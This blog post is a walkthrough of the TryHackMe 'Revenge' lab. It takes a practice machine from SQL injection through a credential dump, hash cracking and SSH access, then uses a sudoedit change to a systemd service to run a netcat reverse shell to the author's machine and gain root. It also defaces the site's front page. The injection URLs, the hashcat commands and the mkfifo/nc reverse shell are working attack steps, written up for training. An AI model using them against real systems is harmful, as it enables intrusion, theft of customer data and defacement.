---
layout: post
title: TryHackMe Walkthrough - Revenge
date: 2021-08-28
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Medium
- Machine
permalink: /2021/08/THM/Revenge
img: 2021/08/Revenge/Revenge.png
---

This room is a little different than the usual TryHackMe rooms. The goal is not to root the machine, but to deface the web site it host, without taking it down. You still need to root the machine, but it's not sufficient.

* Room: Revenge
* Difficulty: Medium
* URL: [https://tryhackme.com/room/revenge](https://tryhackme.com/room/revenge)
* Author: [Nameless0ne](https://tryhackme.com/p/Nameless0ne)

> You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?

The room has a text file with some instructions to download. 

```
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy
```

## Enumeration
First thing, I launched Rustscan to look for opened ports on the server. 

```bash
$ rustscan -a target  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.225.87:22
Open 10.10.225.87:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 06:05 EDT
Initiating Ping Scan at 06:05
Scanning 10.10.225.87 [2 ports]
Completed Ping Scan at 06:05, 0.23s elapsed (1 total hosts)
Initiating Connect Scan at 06:05
Scanning target (10.10.225.87) [2 ports]
Discovered open port 22/tcp on 10.10.225.87
Discovered open port 80/tcp on 10.10.225.87
Completed Connect Scan at 06:05, 0.24s elapsed (2 total ports)
Nmap scan report for target (10.10.225.87)
Host is up, received syn-ack (0.23s latency).
Scanned at 2021-07-28 06:05:04 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

There are only two opened ports: 22 (SSH) and 80 (HTTP).

## Web Site

I started looking around the web site.

![Web Site](/assets/images/2021/08/Revenge/MainSite.png "Web Site")

It's a site for a rubber ducks wholesaler. Close to the bottom of the main page, there was a list of employees. I noted their names, they could be potential usernames. 

The site had two login pages. One that is accessible through the menu on [/login](http://target.thm/login). And one that I found with Gobuster on [/admin](http://target.thm/admin). But they didn't do anything. Clicking on the `LOGIN` button just refreshed the page without posting the credentials. 

## SQL Injection

Since the login pages looked useless, I took a close look at the products page. 

![Products](/assets/images/2021/08/Revenge/Products.png "Products")

Each products has a [details page](http://target.thm/products/1) that had more information about the product, like a picture, the price and if it was in stock. 

![Box Of Duckies](/assets/images/2021/08/Revenge/BoxOfDuckies.png "Box Of Duckies")

The URL to the details page had the product id in it's path (http://target.thm/products/1). I tested for [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) and found out that it was vulnerable. 

Going to the URL [http://target.thm/products/2%20or%201%20=%201](http://target.thm/products/2%20or%201%20=%201) (using the product id '2 or 1 = 1') displayed the details of the first product, not the one with the id 2. 

Now that I knew that it was vulnerable to SQL Injections, I needed to use it to extract data. But first I needed to find out how many columns are returned by the query. I used `Order By 1` to find it. I incremented the column used for sorting until I got an error. The URL [http://target.thm/products/2%20Order%20by%208](http://target.thm/products/2%20Order%20by%208) worked, but `Order By 9` returned an error. So I knew that the query selected 8 columns.

Next I needed to figure which columns could be used to extract data. Not all of them are text and displayed in the page. I used the query [http://target.thm/products/20%20UNION%20SELECT%201,%202,%203,%204,%205,%206,%207,%208](http://target.thm/products/20%20UNION%20SELECT%201,%202,%203,%204,%205,%206,%207,%208) and looked at the resulting page. 

![Columns](/assets/images/2021/08/Revenge/Columns.png "Columns")

From this I knew that the column 2 is used for the name, 8 for the description and 3 for the price. I could use columns 2 or 8 to extract text.

Now I could start extracting data from the database. First I wanted to know the database name.  The query  [20 UNION SELECT 1, database(), 3, 4, 5, 6, 7, 8](http://target.thm/products/20%20UNION%20SELECT%201,%20database(),%203,%204,%205,%206,%207,%208) returned the name `duckyinc`.

Next I extracted the list of tables in that database with '[20 UNION SELECT 1, table_name, 3, 4, 5, 6, 7, 8 FROM information_schema.TABLES Where table_schema = 'duckyinc' LIMIT 0, 1](http://target.thm/products/20%20UNION%20SELECT%201,%20table_name,%203,%204,%205,%206,%207,%208%20FROM%20information_schema.TABLES%20Where%20table_schema%20=%20'duckyinc'%20LIMIT%200,%201)'.

By extracting the tables one at the time with the limit clause, I found three tables: 
* product
* system_user
* user

The table product did not look too interesting, so I started extracting the names of the column in the `system_user` table. I used the query '[20 UNION SELECT 1, column_name, 3, 4, 5, 6, 7, 8 FROM information_schema.COLUMNS Where table_schema = 'duckyinc' and table_name = 'system_user' LIMIT 0, 1](http://target.thm/products/20%20UNION%20SELECT%201,%20column_name,%203,%204,%205,%206,%207,%208%20FROM%20information_schema.COLUMNS%20Where%20table_schema%20=%20'duckyinc'%20and%20table_name%20=%20'system_user'%20LIMIT%200,%201)' to get them.

It had four columns:
* id
* username
* _password
* email

With that information, I could finally extract the data from the table with '[20 UNION SELECT 1, CONCAT(id, ' - ', username, ' - ', _password, ' - ', email), 3, 4, 5, 6, 7, 8 FROM system_user LIMIT 0, 1](http://target.thm/products/20%20UNION%20SELECT%201,%20CONCAT(id,%20'%20-%20',%20username,%20'%20-%20',%20_password,%20'%20-%20',%20email),%203,%204,%205,%206,%207,%208%20FROM%20system_user%20LIMIT%200,%201)'. 

```
1 - server-admin - $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a - sadmin@duckyinc.org

2 - kmotley - $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa - kmotley@duckyinc.org

3 - dhughes - $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK - dhughes@duckyinc.org
```

I used the same method to get the columns and the data from the `user` table.

* id
* username
* _password
* credit_card
* email
* company


```
1 - jhenry - $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa - 4338736490565706 - sales@fakeinc.org - Fake Inc

2 - smonroe - $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm - 355219744086163 - accountspayable@ecorp.org - Evil Corp

3 - dross - $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C - 349789518019219 - accounts.payable@mcdoonalds.org - McDoonalds Inc

4 - ngross - $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO - 4499108649937274 - sales@ABC.com - ABC Corp

5 - jlawlor - $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu - 4563593127115348 - sales@threebelow.com - Three Below

6 - mandrews - $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC - REDACTED - ap@krasco.org - Krasco Org

7 - dgorman - $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm - 4905698211632780 - payable@wallyworld.com - Wally World Corp

8 - mbutts - $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS - 4690248976187759 - payables@orlando.gov - Orlando City

9 - hmontana - $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem - 375019041714434 - sales@dollatwee.com - Dolla Twee

10 - csmith - $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 - 364774395134471 - sales@ofamdollar - O! Fam Dollar
```

This gave me the first flag. It was hidden in the credit card field of a user.

## Initial foothold
With the data in the `user` and `system_user` tables, I had 13 password hashes that I could try to crack. I saved them to a file and launched hashcat to try to break them. After a while, it found the passwords for the system user server-admin and the user dgorman.

```bash
$ hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz, 1423/1487 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 13 digests; 13 unique digests, 13 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

INFO: Removed 2 hashes found in potfile.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: hash.txt
Time.Started.....: Wed Jul 28 06:49:14 2021 (1 hour, 37 mins)
Time.Estimated...: Tue May 31 17:24:47 2022 (307 days, 8 hours)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        6 H/s (5.84ms) @ Accel:4 Loops:16 Thr:1 Vec:8
Recovered........: 2/13 (15.38%) Digests, 2/13 (15.38%) Salts
Progress.........: 41056/186477005 (0.02%)
Rejected.........: 0/41056 (0.00%)
Restore.Point....: 3152/14344385 (0.02%)
Restore.Sub.#1...: Salt:10 Amplifier:0-1 Iteration:2112-2128
Candidates.#1....: starbucks -> 2sexy4u


$ hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --show
$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a:REDACTED
$2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm:REDACTED
```

I tried them both on the SSH server. The credentials for server-admin worked. 

```bash
$ ssh server-admin@target                                                                                                                                 
The authenticity of host 'target (10.10.223.228)' can't be established.
ECDSA key fingerprint is SHA256:p6l0aKeIJlyHmiqZxt/pRvjb++LAjF9jTDp4ZkSCpOk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target,10.10.223.228' (ECDSA) to the list of known hosts.
server-admin@target's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


8 packages can be updated.
0 updates are security updates.


################################################################################
#                        Ducky Inc. Web Server 00080012                        #
#            This server is for authorized Ducky Inc. employees only           #
#                  All actiions are being monitored and recorded               #
#                    IP and MAC addresses have been logged                     #
################################################################################
Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
server-admin@duckyinc:~$ 

server-admin@duckyinc:~$ ls
flag2.txt

server-admin@duckyinc:~$ cat flag2.txt 
REDACTED
```

I was connected to the sever, and I had the second flag.

## Privilege Escalation

Now I needed to find a way to get root access to the server. I looked at sudo permissions and I was able to interact with the duckyinc service. 


```bash
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
```

I looked at the service. 

```
server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=flask-app
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

It was launching the [Gunicorn](https://gunicorn.org/) web server. It was used to served the web site.  I decided to use this service to get a reverse shell. 

I created a file that would be executed by the service start and create the connection to my machine. 

```bash
server-admin@duckyinc:~$ chmod +x /home/server-admin/service

server-admin@duckyinc:~$ cat /home/server-admin/service 
#!/usr/bin/env bash

mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg
```
 
 Then I modified the service with `sudoedit` to be executed as root and run my file.

```bash
server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
#User=flask-app
User=root
Group=www-data
WorkingDirectory=/var/www/duckyinc
#ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecStart=/home/server-admin/service
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

I started a netcat listener on my machine, reloaded the configuration and restarted the service. 

```bash
server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
```

The server connected to my listener and I had root on the server. 

```bash
ehogue@kali:~/Kali/OnlineCTFs/TryHackMe/Revenge$ nc -lknvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.223.228 34820

whoami
root

ls
app.py
__pycache__
requirements.txt
static
templates

cd

ls

pwd
/root

ls -la
total 52
drwx------  7 root root 4096 Aug 28  2020 .
drwxr-xr-x 24 root root 4096 Aug  9  2020 ..
drwxr-xr-x  2 root root 4096 Aug 12  2020 .bash_completion.d
lrwxrwxrwx  1 root root    9 Aug 10  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3227 Aug 12  2020 .bashrc
drwx------  3 root root 4096 Aug  9  2020 .cache
drwx------  3 root root 4096 Aug  9  2020 .gnupg
drwxr-xr-x  5 root root 4096 Aug 12  2020 .local
-rw-------  1 root root  485 Aug 10  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Aug 10  2020 .selected_editor
drwx------  2 root root 4096 Aug  9  2020 .ssh
-rw-------  1 root root 7763 Aug 12  2020 .viminfo

S: 0 Window: 2 Pane: 1        
```

I was connected on the server. But there was no root flag. I looked around a little bit, then I remembered that the goal of the room was to deface the site without bringing it down. 

I edited the file `/var/www/duckyinc/templates/index.html` and added some text to it. 

I went back to the terminal opened as server-admin. I reverted my changes to the service and restarted it. When I went to the web site again, my text was there. But there was still no flag to be found. 

I changed the service again to be able to connect as root. When I got the reverse shell, there was a new file in the root folder. 

```bash
$ nc -lknvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.223.228 34824

cd /root

ls
flag3.txt

cat flag3.txt
REDATED
```

